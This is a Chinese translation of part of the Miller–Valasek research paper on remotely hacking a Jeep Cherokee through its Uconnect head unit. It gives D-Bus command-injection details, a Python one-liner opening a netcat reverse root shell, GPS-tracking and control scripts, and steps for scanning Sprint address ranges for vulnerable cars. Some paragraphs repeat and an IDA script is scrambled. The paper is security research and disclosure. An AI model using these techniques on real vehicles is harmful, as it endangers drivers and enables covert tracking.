@@ -1,0 +1,280 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">远程入侵原装乘用车（中）</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">唐朝实验室</a> <span class="bull">·</span> <time title="2015/11/27 16:27" ui-time="" datetime="2015/11/27 16:27" class="published ng-binding ng-isolate-scope">2015/11/27 16:27</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p><strong>Author: Dr. Charlie Miller (<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="dbb8b6b2b7b7bea99bb4abbeb5a9b8bef5b4a9bc">[email&#160;protected]</a>) Chris Valasek (<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="533025323f3220363813343e323a3f7d303c3e">[email&#160;protected]</a>)</strong></p><p><strong>唐朝实验室翻译组:朱于涛 刘家志</strong></p><h1>0x01 利用D-Bus服务</h1><hr><p>D-Bus系统是可以匿名访问的，跨进程通讯经常会使用D-Bus系统。我们认为，D-Bus系统本不应该会暴露，所以，我们有点意外，利用D-Bus来运行代码居然是可行的。</p><h2>获取代码执行</h2><p>你已经发现了D-Bus服务暴露在了端口6667上，并且这个端口是在Uconnect系统上运行的。所以，我们认为通过不认证办法来执行代码是最好的方式。在一开始的时候，我们就怀疑过这个服务，因为这个服务在设计上就是为了处理通讯。我们推测，这种通讯一定在某种程度上是受信的，并且在设计上就不会处理远程数据。在网络上，暴露像D-Bus这样一个强大和全面的服务会造成几个安全问题，无论是功能滥用，还是代码注入，甚至是内存崩溃。</p><p>在上文的D-Bus服务章节，我们发现了几个D-Bus服务，以及调用每个服务的方法，但是有一个非常重要的服务没有提到，那就是‘NavTrailService’ 。‘NavTrailService’的代码是在这里‘<code>/service/platform/nav/navTrailService.lua</code>’ 实现的。因为内存崩溃非常难实现，而且这又是一个LUA脚本，所以我们的第一个想法就是查找命令注入漏洞。我们发现了下面的一个方法，这个方法是在一个用户命名的文件上操作的。</p><pre><code>function methods.rmTrack(params, context)
+  return {
+    result = os.execute("rm \"" .. trail_path_saved .. params.filename .. "\"")
+  }
+end
+</code></pre><p>‘rmTrack’方法中包含有一个命令注入漏洞，如果攻击者能调用D-Bus方法，那么利用这个漏洞，攻击者就可以通过指定包含有shell元字符的文件来运行任意的shell命令（当然也有其他类似的方法）。我们的怀疑是正确的，因为在处理可信来源的用户输入时，命令注入是一种非常典型的方法。</p><p>但是，这里的命令执行不是必要的，因为实际上‘NavTrailService’服务提供了一种 “执行”方法，这种方法就是设计用于执行任意shell命令的！嘿，这是一个功能，不是一个bug！下面列出的是‘NavTrailService’可用的所有服务，加粗显示的两个服务是我们所讨论的。（<strong>"execute",</strong>，<strong>"rmTrack"</strong>）</p><pre><code>"com.harman.service.NavTrailService":  
+{"name":"com.harman.service.NavTrailService",  
+"methods":{"symlinkattributes":"symlinkattributes",  
+"getProperties":"getPr operties","execute":"execute",
+"unlock":"unlock","navExport":"navExport","ls": "ls",  
+"attributes":"attributes","lock":"lock","mvTrack":"mvTrack",  
+"getTracksFo lder":"getTracksFolder","chdir":"chdir",  
+"rmdir":"rmdir","getAllProperties":"g etAllProperties",  
+"touch":"touch","rm":"rm","dir":"dir","writeFiles":"writeFil es",  
+"setmode":"setmode","mkUserTracksFolder":"mkUserTracksFolder",  
+"navGetImpo rtable":"navGetImportable",  
+"navGetUniqueFilename":"navGetUniqueFilename","mkd ir":"mkdir",  
+"ls_userTracks":"ls_userTracks","currentdir":"currentdir","rmTrac  
+k":"rmTrack","cp":"cp","setProperties":"setProperties",  
+"verifyJSON":"verifyJS ON"}},
+</code></pre><p>你可以推测出在头单元上使用根权限来执行代码并不难，尤其是当默认安装的是常用的通讯工具时，比如netcat（nc）。我们希望这个漏洞可以更出色一点（编辑注释：这是假话！），虽然在头单元上执行代码不是很困难。下面的四行Python代码可以在未经篡改过的头单元上打开一个远程根shell，这意味着攻击者并不需要通过劫持头单元就可以入侵系统。</p><pre><code>#!python
+import dbus
+bus_obj=dbus.bus.BusConnection("tcp:host=192.168.5.1,port=6667") 
+proxy_object=bus_obj.get_object('com.harman.service.NavTrailService','/com/ha rman/service/NavTrailService') 
+playerengine_iface=dbus.Interface(proxy_object,dbus_interface='com.harman.Ser viceIpc')
+print playerengine_iface.Invoke('execute','{"cmd":"netcat -l -p 6666 | /bin/sh | netcat 192.168.5.109 6666"}')
+</code></pre><h1>0x02 Uconnect攻击载荷（attack payloads）</h1><p>至此，我们就可以在头单元上运行任意代码了，尤其是在Uconect系统中的OMAP芯片上。在这一部分，我们讲解了几种能影响到汽车内部以及无线电广播功能的LUA脚本，例如调高音量或阻止某个控制开关的响应（也就是音量）。通过这个脚本你就能知道在具备了远程shell和Uconnect系统权限后，我们可以在汽车上做哪些手脚。接下来，我们会说明如何通过远程访问D-Bus系统来实现平行感染并发送任意的CAN信息，从而影响汽车上除了头单元以外的其他系统。</p><h2>GPS</h2><p>头单元能够查询并获取车辆上的GPS坐标，不是通过Sierra Wireless调制解调器就是通过Wi-Fi。通过端口6667上未认证的D-Bus通讯也可以获取到这些值，这样造成的结果就是可以追踪任意车辆的位置。换句话说，我们下面的这个脚本就可以在头单元上运行，但是只能通过查询暴露的D-bus服务来获取坐标值。</p><pre><code>service = require("service")
+gps = "com.harman.service.NDR"
+gpsMethod = "JSON_GetProperties"
+gpsParams = {
+   inprop = {
+   "SEN_GPSInfo"
+   }
+}
+response = service.invoke(gps, gpsMethod, gpsParams) print(response.outprop.SEN_GPSInfo.latitude, response.outprop.SEN_GPSInfo.longitude)
+</code></pre><p>例如，如果你在头单元上执行‘<code>lua getGPS.lua</code>’，那么就会返回如下的结果：</p><h1>lua getGPS.lua</h1><p>40910512 -73184840</p><p>然后，你可以稍加修改，在谷歌地图中输入40.910512, -73.184840，这样就能确定其位置了。在这个例子中，是长岛的某个位置。</p><h2>HVAC</h2><p>头单元可以控制汽车的供暖和空调。下面的代码会把风扇设置到一个任意速度。</p><h2>广播音量</h2><p>Uconnect系统的一个主要功能就是控制广播。攻击者可以很轻易地把广播音量设置成任意值。例如，如果攻击者知道现在播放的是爱司基地（Ace of Base）的歌，他们可以把音量调整到一个合适的级别（也就是最合适的音量）。</p><pre><code>require "service"
+params = {}
+params.volume = tonumber(arg[1]) 
+x=service.invoke("com.harman.service.AudioSettings", "setVolume", params)
+</code></pre><h2>低音</h2><p>有时候，比如在听2 Live Crew的时候，调高低音是唯一的选择。喜欢重低音的攻击者可以使用下面的脚本来调整相应的级别。</p><pre><code>require "service"
+params = {}
+params.bass = tonumber(arg[1]) x=service.invoke("com.harman.service.AudioSettings", "setEqualizer", params
+</code></pre><h2>电台（FM）</h2><p>在路途中，最重要的任务之一就是选择一个合适的FM电台。通过编程LUA脚本也可以更换电台。</p><pre><code>require "service"
+Tuner = "com.harman.service.Tuner"
+service.invoke(Tuner, "setFrequency", {frequency = 94700})
+</code></pre><h2>显示屏</h2><p>这里有很多很多种办法都可以修改Uconnect的显示状态，比如完全关闭显示屏或显示后置摄像头。下面的几个代码示例可以更改屏幕显示：</p><pre><code>require "service"
+x=service.invoke("com.harman.service.LayerManager", "viewBlackScreen", {}) 
+x=service.invoke("com.harman.service.LayerManager", "stopBlackScreen", {}) 
+x=service.invoke("com.harman.service.LayerManager", "viewCameraInput", {}) 
+x=service.invoke("com.harman.service.LayerManager", "stopViewInput", {}) 
+x=service.invoke("com.harman.service.LayerManager", "showSplash", {timeout = 2})
+</code></pre><h2>显示图片</h2><p>你还可以更改头单元上的显示屏来显示你选中的图片。这张图片的大小和格式（png）必须是正确的。然后，这张照片必须放到文件系统上的某个位置。最后，你就能告诉头单元要显示这张照片。</p><pre><code>mount -uw /fs/mmc0/
+cp pic.png /fs/mmc0/app/share/splash/Jeep.png pidin arg | grep splash
+kill &lt;PID&gt;
+splash -c /etc/splash.conf &amp;
+</code></pre><p>一旦这张图片就位了，你就可以调用上述的‘showSplash’ 方法。</p><p><img alt="" img-src="ik_m_xv7b7jjhponnv5hcg?s=2sdkadyvrlzm"></p><p>图-两个年轻人</p><h2>旋钮</h2><p>一个更有趣的发现之一就是在杀死某项服务后，能够使电台的旋钮控制失效，比如音量和调音器控制。通过杀死主要的D-Bus服务，你就可以使所有的电台控制失去响应。如果再执行几项其他的操作，这种攻击会变得尤其烦人，比如把低音和音量调到最高。</p><pre><code>kill this process: lua -s -b -d /usr/bin service.lua
+</code></pre><h1>0x03 蜂窝利用</h1><hr><p>目前，我们已经知道了如何在头单元上运行代码，前提是你能用USB设备（劫持）来连接汽车或访问车内的Wi-Fi（利用D-BUS漏洞/功能）。最大的问题是，这些入侵方法都要么需要接触到汽车，要么就需要攻击者加入到车上的Wi-Fi热点。</p><p>如果能加入到车内的Wi-Fi热点并进行漏洞利用是非常让人激动的，因为这就说明我们已经远程入侵了一辆原装汽车，但是，对我们来说，这其中的前提和限制还是太多了。首先，我们假设多数用户不会购买车上的Wi-Fi服务，因为这项服务的收费太高了，每月34.99美元（约是217.33元）。第二，问题在于Wi-Fi的加入，虽然考虑到密码的生成方式，问题并不大。最后，也是最重要的，Wi-Fi的范围对于汽车入侵来说太短了，大约只有32米。虽然这个范围足够攻击者开车接近目标车辆来入侵其头单元并发送命令，但是这不是我们最终想要的目标。我们会继续调查能否从更远的距离上利用漏洞来攻击目标车辆。</p><h2>网络设置</h2><p>观察Uconnect系统的网络配置，我们可以在其中找到几个用于通讯的接口。这里面就有一个用于内部Wi-Fi通讯的接口uap0，另一个PPP接口-ppp0，我们猜测是用于通过Sprint的3G服务与外界通讯。</p><pre><code># ifconfig
+lo0: flags=8049&lt;UP,LOOPBACK,RUNNING,MULTICAST&gt; mtu 33192
+inet 127.0.0.1 netmask 0xff000000
+pflog0: flags=100&lt;PROMISC&gt; mtu 33192
+uap0: flags=8843&lt;UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500
+address: 30:14:4a:ee:a6:f8
+media: &lt;unknown type&gt; autoselect
+inet 192.168.5.1 netmask 0xffffff00 broadcast 192.168.5.255
+ppp0: flags=8051&lt;UP,POINTOPOINT,RUNNING,MULTICAST&gt; mtu 1472 inet 21.28.103.144 -&gt; 68.28.89.85 netmask 0xff000000
+</code></pre><p>Uconnect系统会把地址192.168.5.1分配给连接到Wi-Fi访问点的主机。如果用户了连接到了Uconnect系统，他们就会看到IP地址68.28.89.85。但是，在这个地址上，端口6667不是打开的。在接入网络时，21.28.103.144是Uconnect实际的接口地址，但是只开放给内部的Sprint网络。</p><p>在经过实验后，我们发现每当汽车重新启动时，PPP接口的IP地址就会更改，但是地址空间中总是会填充两个A类地址块：21.0.0.0/8 或 25.0.0.0/8，这两个地址空间应该是Sprint给汽车的IP地址保留的。在这里可能保留了更多的地址块来供汽车使用，但是我们很确定的是，凡是运行着Uconnect系统的车辆中都有这两个地址空间。</p><p>我们还想要检查D-Bus服务是不是的确绑定到了蜂窝接口上的同一个端口（6667），允许通过IP进行D-Bus交互。下面是一个活动的头单元上的netsat输出：</p><pre><code># netstat
+Active Internet connections
+Proto Recv-Q Send-Q      Local Address          Foreign Address      State
+tcp        0      0      144-103-28-21.po.65531 68.28.12.24.8443     SYN_SENT
+tcp        0     27      144-103-28-21.po.65532 68.28.12.24.8443     LAST_ACK
+tcp        0      0      *.6010 *.*             *.*                  LISTEN       
+tcp        0      0      *.2011                 *.*                  LISTEN
+tcp        0      0      *.6020 *.*             *.*                  LISTEN
+tcp        0      0      *.2021                 *.*                  LISTEN
+tcp        0      0      Localhost.3128         *.*                  LISTEN
+tcp        0      0      *.51500                *.*                  LISTEN 
+tcp        0      0      *.65200                *.*                  LISTEN
+ESTABLISHED
+tcp        0      0      localhost.65533        *.*                  LISTEN
+ESTABLISHED
+tcp        0      0      *.4400                 *.*                  LISTEN
+tcp        0      0      *.irc                  *.*                  LISTEN
+udp        0      0      *.*                    *.*                  
+udp        0      0      *.*                    *.*                 
+udp        0      0      *.*                    *.*                  
+udp        0      0      *.*                    *.*                  
+udp        0      0      *.bootp                *.*  
+</code></pre><p>从上面的输出中你可以看出，与IRC关联的端口6667绑定到了所有的接口上。所以，我们可以通过蜂窝网络来执行D-Bus通讯，从而攻击这辆吉普切诺。我们首先想到的是获取一个飞蜂窝（Femtocell）设备并强制这台吉普切诺加入我们的网络，这样就能直接通过蜂窝从更远的范围上与车辆通讯。</p><h2>飞蜂窝（Femtocell）</h2><p>飞蜂窝设备基本上就是一个迷你的蜂窝塔，用于帮助消费者改善居住位置的信号接收问题。除了当做一个信号塔，这个设备还可以用于拦截蜂窝流量，按照攻击者的意愿进行修改。</p><p>我们还从Ebay上购买了几个老款的Sprint Airave基站，其中有了两个是坏的，另一个 “全新的”设备据称被盗了（感谢Ebay！）。我们选用了Airave 2.0基站，因为我们知道这个设备上有一个漏洞，利用这个漏洞可以打开设备上的Telnet和HTTPS。</p><p><img alt="" img-src="yvjye5wsozfcmxfl27zf5a?s=2sdkadyvrlzm"></p><p>图-Sprint Airave 2.0</p><p>在运行了漏洞后，我们的Airave设备就可以通过Telnet远程访问了，实际上就是给我们提供了设备上的一个Busybox shell。我们估计，基本上这些工具就足够我们通过蜂窝网络与这台吉普切诺通讯了。</p><p>让我们高兴的是，我们通过蜂窝网络成功地ping到了这辆吉普上，并且能与D-Bus进行通讯。也就是说，我们可以扩大攻击范围了，并通过Wi-Fi利用远程命令执行中存在的同一个漏洞，而且不需要针对原装车辆进行任何修改（不仅仅是启用了Wi-Fi的车辆）。</p><p>可以说这是一次巨大的胜利，但是我们意识到这个攻击范围还是很有限，我们还想要继续扩大范围，我们也能够做到。</p><h2>蜂窝访问</h2><p>我们选用飞蜂窝设备的原因是我们认为普通的Sprint信号塔会拦截两台设备间的通讯。通过使用我们自己的信号塔（飞蜂窝），我们能保证能够与吉普切诺上的Uconnect系统通讯。但是，实际上，Sprint并不会在他们的网络上拦截设备之间的这类流量。我们首先验证了，在一个信号塔内，一台Sprint设备（在我们的例子中是一个一次性手机）可以与另一台Sprint设备通讯，也就是直接与我们的吉普车通讯。这样攻击范围就可以扩大到一个信号塔的范围了。</p><p>更让我们震惊的是，其连接性并不局限于单个的信号塔。全国范围内的任何Sprint设备在任何地方都可以与其他位置的Sprint设备通讯。例如，下面就是克里斯在匹兹堡发起的一个会话，证明了他可以在圣路易斯访问这台吉普车的D-Bus端口。</p><pre><code>$ telnet 21.28.103.144 6667
+Trying 21.28.103.144...
+Connected to 21.28.103.144.
+Escape character is '^]'.
+a
+ERROR "Unknown command"
+</code></pre><p>注意：连接主机必须要在Sprint网络上（例如，连接到Sprint手机的一台笔记本或连接到Uconnect Wi-Fi热点的笔记本），并且不能是互联网上的一台通用主机。</p><h1>0x04 扫描有漏洞的车辆</h1><hr><p>为了找到有漏洞的车辆，你只需要在IP地址21.0.0.0/8 和 25.0.0.0/8 上扫描Sprint设备的端口6667。任何有响应的设备就是有漏洞的Uconect系统（或一个IRC服务器）。为了确定这一点，你可以尝试Telnet登陆这台设备并查找错误字符串“Unknown command”。</p><p><img alt="" img-src="lsxs5iy87gg3jp5p8qjaza?s=2sdkadyvrlzm"></p><p>图-扫描设置</p><p>如果你想的话，接下来你可以与D-Bus服务交互，从而执行上述的任何操作。除非你得到了车主的允许，否则不要这么做。</p><h2>扫描结果</h2><p>为了了解有多少车辆会受到这个漏洞的影响，以及存在漏洞的车型，我们执行了一些网络扫描。</p><p>下面就是我们通过扫描发现的一些可能存在漏洞的车型：</p><pre><code>2013 道奇蝰蛇
+2013 RAM 1500
+2013 RAM 2500
+2013 RAM 3500
+2013 RAM CHASSIS 5500 
+2014 道奇杜兰戈
+2014 道奇蝰蛇
+2014 吉普切诺
+2014 吉普大切诺 
+2014 RAM 1500
+2014 RAM 2500
+2014 RAM 3500
+2014 RAM CHASSIS 5500 
+2015 克莱斯勒 200
+2015 吉普切诺
+2015 吉普大切诺
+</code></pre><p>注意：我们实际上并没有利用漏洞来攻击这些车辆，所以我们也无法100%的确定这些车型有漏洞，但是这些车辆上确实有一个监听D-Bus的服务，我们在没有认证的情况下可以远程与D-Bus服务交互。</p><h2>估算有漏洞的车辆数量</h2><p>在一次扫描会话中，我们发现了2695台车辆。当时，我们根据VIN编号确定了其中有21台是重复的。</p><p>利用基于标记重补法的公式，我们估算了有漏洞的车辆数量。我们的想法是，如果扫描所有包含有漏洞的车辆，你会看到很多重复结果，如果你只扫描一小部分，那么重复的数量不会太多。所以，我们并没有看到太多的重复。注意，我们的设置与这个数学模型的猜测并不完全一致，但是很接近。无论如何，菲亚特克莱斯勒公司清楚真实的数量。</p><p>我们使用了贝叶斯算法来估计其数量：</p><pre><code>(2694 * 2694) / 19 +/- sqrt((2694 *2694 *2675 *2675) / (19 *19 *18)) = 381,980 +/- 89,393
+</code></pre><p>我们估算，大约在<strong>292,000</strong>到<strong>471,000</strong>台汽车中存在漏洞。然而，，我们观察了一些在2013年和2014年生产的车型，克莱斯勒称他们2014年的销售数量在1,017,019左右，也就是说真实数量要比我们估计得多。</p><p>注意：此次研究造成的召回事件影响了140万台汽车。看来我们估计少了。</p><h2>汽车蠕虫</h2><p>因为，一台汽车可以扫描其它有漏洞的车辆，并且漏洞利用不需要任何用户交互，所以写一个蠕虫是可行的。这个蠕虫要能够扫描有漏洞的车辆，并使用自己的有效载荷来扫描其它的漏洞车辆并进行漏洞利用。这非常有趣也很可怕。请不要这样做。</p><h1>0x05 V850</h1><hr><p>我们先前讨论过，Uconnect系统能够与两个不同的CAN总线通讯。CAN通讯是由Renesas V850ES/FJ3芯片通讯，请参考CAN连接性章节。但是，OMAP芯片，我们在漏洞利用了D-Bus后在这上面执行了代码，这块芯片并不能发送CAN信息。不过，OMAP芯片可以与v850芯片通讯，而v850芯片可以发送CAN信息。</p><p>在调查头单元时，我们把V850和CAN通讯称作了 “IOS”。有意思的是，头单元（OMAP芯片）可以更新IOC（V850芯片），通常是通过U盘。接下来，我们会讨论IOC是如何更新的，并看看我们能不能利用这种机制在IOC上刷入篡改过的固件，从而允许我们在入侵了OMAP芯片后发送CAN信息。</p><p>我们先前讨论过，Uconnect系统能够与两个不同的CAN总线通讯。CAN通讯是由Renesas V850ES/FJ3芯片通讯，请参考CAN连接性章节。但是，OMAP芯片，我们在漏洞利用了D-Bus后在这上面执行了代码，这块芯片并不能发送CAN信息。不过，OMAP芯片可以与v850芯片通讯，而v850芯片可以发送CAN信息。</p><p>在调查头单元时，我们把V850和CAN通讯称作了 “IOS”。有意思的是，头单元（OMAP芯片）可以更新IOC（V850芯片），通常是通过U盘。接下来，我们会讨论IOC是如何更新的，并看看我们能不能利用这种机制在IOC上刷入篡改过的固件，从而允许我们在入侵了OMAP芯片后发送CAN信息。</p><h2>模式</h2><p>在任何时候，都可以在下面的三种模式下更新IOC。第一种是应用模式，也就是用户认为的 “常规”模式，因为这种模式具有引导程序、完整的固件和运行的应用代码。第二种模式是引导程序模式，设计用于更新IOC上的应用固件。最后，是引导程序更新模式，在这个模式中，IOC会进入一种可以更新引导程序的状态，而引导程序是负责把固件加载到内存并把IOC放入到应用中。</p><h2>更新V850</h2><p>再回过头去观察更新ISO中的’manifest.lua’，我们看到这里有一个文件就是用于更新IOC的应用固件-‘cmcioc.bin’。在后面你会看到，这个二进制文件的确是一个完整的V850固件，通过逆向工程，我们发现了更多有趣的点。</p><pre><code>ioc= 44 {
+name                   = "ioc installer.",
+installer              = "ioc",
+data                   = "cmcioc.bin",
+}
+</code></pre><p>通过更深入的调查’manifest.lua’，你会发现还有几个文件与IOC更新或相应的启动程序更新有关系。</p><pre><code> local units =
+{ ...
+     ioc_bootloader =
+     {
+         name                      = "IOC-BOOTLOADER",
+         iocmode                   = "no_check",
+         installer                 = "ioc_bootloader",
+         dev_ipc_script            = "usr/share/scripts/dev-ipc.sh",
+         bootloaderUpdater         = "usr/share/V850/cmciocblu.bin",
+         bootloader                = "usr/share/V850/cmciocbl.bin",
+         manifest_file             = "usr/share/V850/manifest.xml"
+     },
+     ioc =
+     {
+         name                      = "IOC",
+         installer                 = "ioc",
+         dev_ipc_script            = "usr/share/scripts/dev-ipc.sh",
+         data                      = "usr/share/V850/cmcioc.bin"
+      },
+</code></pre><p>实际用于IOC更新或启动程序更新的文件数量并不多。我们最感兴趣的还是应用代码，因为我们能从中找到最佳的机会来找到用于发送和接收CAN信息的代码，在下面用加粗的就是（<strong>cmcioc.bin</strong>）。</p><pre><code>$ ls -l usr/share/V850/
+total 1924
+-r-xr-xr-x    1 charlesm staff 458752 Jan 30 2014 cmcioc.bin
+-r-xr-xr-x    1 charlesm staff 65536 Jan 30 2014 cmciocbl.bin
+-r-xr-xr-x    1 charlesm staff 458752 Jan 30 2014 cmciocblu.bin
+-r-xr-xr-x    1 charlesm staff 604 Jan 30 2014 manifest.xml
+</code></pre><p>注意：我们知道要逆向哪个文件，需要找到一种方法把修改过的固件刷到V850芯片上，所以我们可以平行移动代码执行，通过CAN总线来物理控制头单元。我们很幸运，系统上有一个二进制就是设计用于执行我们想要的操作。</p><p>通过‘iocupdate’可执行程序，IOC应用代码可以推入到Uconnect系统上的V850固件，这个可执行程序就是’ioc.lua’。</p><pre><code>iocupdate -c 4 -p usr/share/V850/cmcioc.bin
+</code></pre><p>‘iocupdate’的帮助文档证实了我们的初步分析，根据其说明，这个文件确实是用于从头单元向IOC发送二进制文件</p><pre><code>%C: a utility to send a binary file from the host processor to the IOC [options] &lt;binary file name&gt;
+Options:
+-c       &lt;n&gt; Channel number of IPC to send file over (default is /dev/ipc/ch4) -p Show progress
+-r       Reset when done
+-s       Simulate update
+Examples:
+/bin/someFile.bin         (will default to using /dev/ipc/ch4) 
+-c7 -r /bin/someFile.bin  (will reset when done)
+-sp                       (simulate update with progress notification)
+</code></pre><p>在我们想出如何编程V850数据包之后，我们需要逆向并修改IOC应用固件来添加代码，从而接收并转发命令到CAN总线。最重要的部分是逆向IOC应用固件，因为我们这样会暴露必要的代码来发送和接收来自总线的CAN信息。幸运的是，我们发现IOC可以重新刷入固件，并且没有使用加密签名来验证固件是不是合法的。</p><h2>逆向IOC</h2><hr><p>这次研究的主要目的不仅仅是为了证明汽车的通讯系统是可以入侵的（因为我们早就知道这一点了），而是为了证明在成功远程入侵后，我们先前研究证明过的攻击方法可以用同样的方式执行。</p><p>正如我们多次提到的，Uconnect系统使用了芯片组Renesas V850/Fx3与车内网络通讯。我们意识到，如果我们想要从车辆上发送并接收CAN信息，我们很可能需要逆向这个固件，来弄清楚究竟要如何调用与CAN相关的函数。</p><p>不出意外，我们会使用IDA Pro作为我们的逆向工程平台。我们很幸运，已经有一个写好的处理器模块符合我们的架构要求，NEC V850E1/ES [V850E1]</p><p><img alt="" img-src="now8evvj94h-tv6dbynxkw?s=2sdkadyvrlzm"></p><p>图-V850处理器类型</p><p>一旦固件加载到了IDA Pro，你就能看到固件中的第一条指令，这条指令会跳转到设置代码，初始化需要的值来实现功能。值得注意的是，简单地把跳转到初始化代码作为第一条指令在固件镜像中并不常见，Uconnect镜像只是凑巧对我们很友好：</p><p><img alt="" img-src="fyyugxshgzjtvvyntasr1w?s=2sdkadyvrlzm"></p><p>图-跳转代码</p><p>在下面你会看到，一些寄存器都设置到了特定的值，其中最有趣的是“mov 0x3FFF10C, gp”，这样我们就知道了GP寄存器的值。GP寄存器是用于设置相对地址（随后讨论）。另外，我们根据0x77966上R5位置的值判断，镜像的起始地址是0x10000。</p><p><img alt="" img-src="0ipoummwfxvc4tiycamlca?s=2sdkadyvrlzm"></p><p>图-V850初始化代码</p><p>然后，我们可以回来并重新加载镜像ROM的起始位置，加载位置是0x10000。设置这些地址值能保证我们可以逆向所有必要的代码，并确保交叉引用会正确地暴露。</p><p><img alt="" img-src="yywblcm7j7dtjtgr9qa5oa?s=2sdkadyvrlzm"></p><p>图-镜像地址</p><p>仅仅是因为我们获取到了可读的V850汇编代码，还不能说项目的逆向部分就完成了。相反，我们用了几个周的时间才通过逆向V850固件，获取到了所有必要的功能，从而修改固件镜像来通过无线接口来接收任意的CAN信息。</p><p>第一步是通过查找所有的代码来正常化IDB，修复IDA Pro无法弄明白的部分，创建函数并保证所有的函数调用和交叉引用是正确的。这一过程大都是自动进行的，通过在这些位置上查找特定的操作码并创建代码。IDA Python让这个任务变得很简单：</p><p><img alt="" img-src="mbtvm1jh__0vv1r4vaylhg?s=2sdkadyvrlzm"></p><p>图-Python找到的代码函数</p><p>如果你的工作没有出错，你会在IDB的ROM片段中看到一篇蓝色的海洋，显示了所有确定了位置的代码和函数。</p><p><img alt="" img-src="erqryu_hw1f9ylg339sxgw?s=2sdkadyvrlzm"></p><p>图-IDA Pro的ROM部分</p><p>现在IDB已经是标准的了，这样我们就可以读取数据表，让V850/Fx3处理器来弄明白这些片段、地址、寄存器和其他的重要信息，用于逆向出我们需要的特定信息。</p><p>搞清楚了V850的地址空间和相关的固件是我们的首要任务。只要阅读了V850的介绍文档并弄明白了不同区段上的代码、外围设备和RAM后，这个任务就会变得很简单。</p><p><img alt="" img-src="wrpewaxpycmsy09z1w88jw?s=2sdkadyvrlzm"></p><p>图-V850的介绍文档</p><p>然后，我们可以在我们的IDB上创建合适的区段，来反映V850处理器的地址空间布局，用于运行我们的固件。我们知道ROM区段是从0x10000 开始的，直到0x70000，包含了我们的可执行代码。我们的处理器有32KB的RAM，映射的是0x3FF7000-3FFEFFF 。不出意外，变量就会储存在这个RAM区域中，并且在我们的IDB中显示，这个RAM区域中有很多交叉引用。另外还有一个特殊函数寄存器（SFR）区段。SFR是内存映射寄存器，其目的有很多。</p><p>最后，也是最有趣的，这有一个12KB的可编程外围设备I/O区域（PPA），这里面包括有CAN模块，与CAN模块相关的寄存器和相应的信息缓冲区。这个区域的基址是外围区域选择控制寄存器（BPC）指定的。一般对于微控制器来说，PPA的基址会固定到0x3FEC000。下面的图像中列出了我们在IDB中发现的所有区段。</p><p><img alt="" img-src="ljnbk3bszu_agv6d6tqj1w?s=2sdkadyvrlzm"></p><p>图-Uconnect的固件区段</p><p>之前我们讨论过V850是如何利用GP的相对地址来获取RAM中的变量。你会发现，使用了GP中负偏移的代码反过来会变成一个虚拟地址。比如（如下），把值-0x2DAC移动到GP，有效地从0x3FFF10C中减去0x2DAC，这样我们就得到了一个地址：0x3FFC360。</p><p><img alt="" img-src="v7gl_f_zhmt0lie9segc0q?s=2sdkadyvrlzm"></p><p>图-基于GP的地址示例</p><p>我们写了一个脚本来遍历IDB中所有的函数，并为使用了GP相对地址的一些函数创建了一个交叉引用。</p><pre><code>def do_one_function(fun):
+       for ea in FuncItems(fun):
+             mnu = idc.GetMnem(ea)
+             # handle mova, -XXX, gp, REG
+             if idc.GetOpnd(ea,1) == 'gp' and idc.GetOpType(ea,0) == 5:
+                        opnd0 = idc.GetOpnd(ea,0)
+                        if "unk" in opnd0:
+                                continue
+                        if("(" not in opnd0):
+                                data_ref = gp + int(idc.GetOpnd(ea,0), 0)
+                                print "MOV: Add xref from %x -&gt; %x" % (ea, data_ref)
+                                idc.add_dref(ea, data_ref, 3)
+in idc.GetOpnd(ea,1):
+if "CB2CTL" in op2:
+        continue
+# handle st.h REG, -XXX[gp]
+op2 = idc.GetOpnd(ea,1)
+if 'st' in mnu and idc.GetOpType(ea,0) == 1 and 'gp' in op2 and "(" not
+                    end = op2.find('[')
+                    if end &gt; 0:
+                           offset = int(op2[:end], 0)
+                           print "ST: Add xref from %x -&gt; %x" % (ea, gp + offset)
+                           idc.add_dref(ea, gp + offset, 2)
+             # handle ld.b -XXX[gp], REG
+             op1 = idc.GetOpnd(ea,0)
+             if 'ld' in mnu and 'gp' in op1 and idc.GetOpType(ea,1) == 1 and "(" not
+in         idc.GetOpnd(ea,0):
+                        if "unk" in op1:
+continue
+                    end = op1.find('[')
+                    if end &gt; 0:
+                           offset = int(op1[:end], 0)
+                           print "LD: Add xref from %x -&gt; %x" % (ea, gp + offset)
+                           idc.add_dref(ea, gp + offset, 3)
+</code></pre><p>这些代码和交叉引用能让你查看变量的引用位置，并跟踪它们来查找特定的功能。</p><p><img alt="" img-src="wx75y9kdh214l_kwmtiqna?s=2sdkadyvrlzm"></p><p>图-RAM的外部引用</p><p>现在，我们已经将代码正常化了，并且RAM中的变量也有了交叉引用，接下来我们要填充PPA区段，因为CAN交互大多都是在这里进行。我们假设所有负责处理CAN的函数，比如读取总线中的信息，向队列写入信息，都会引用这个内存地址区域。在第20章，我们介绍了每个CAN模块的功能和寄存器。V850最多可以有4个CAN模块来处理每个数据包，但是，在我们的固件中，我们只发现了两个。</p><p>第20.5章中列出了CAN模块使用的所有寄存器和信息缓冲区。这些寄存器和信息缓冲区来自PBA的一个偏移。如果你还记得我们上面说过的，我们的微控制器使用的PBA是0x3FEC000。然后，我们可以遍历每个模块的所有寄存器和CAN缓冲区，并在IDB中为其创建名称，这样我们就可以查找交叉引用了，反过来，我们可以借此找到与CAN总线交互的代码。下面使我们写的一个Python脚本部分，能够将合适的名称填充到PPA。完整的脚本叫做’create&#95;segs&#95;and_regs.py’，观察这个脚本你就能知道所有的这些区段是如何创建的，填充是如何处理的。</p><p><img alt="" img-src="dy_ted-0jrnqptzp-rsnxw?s=2sdkadyvrlzm"></p><p>图-在PPA中创建CAN值</p><p>接着，你可以前往IDB中的几个位置，检查这些位置上的布局和交叉引用。例如，下图中显示的就是CAN模块0中，CAN信息缓冲区的第二个和第三个位置（分别是01和02）。</p><p><img alt="" img-src="fhhpjk8fnvxuovizybn25a?s=2sdkadyvrlzm"></p><p>图-CAN模块0的信息缓冲区 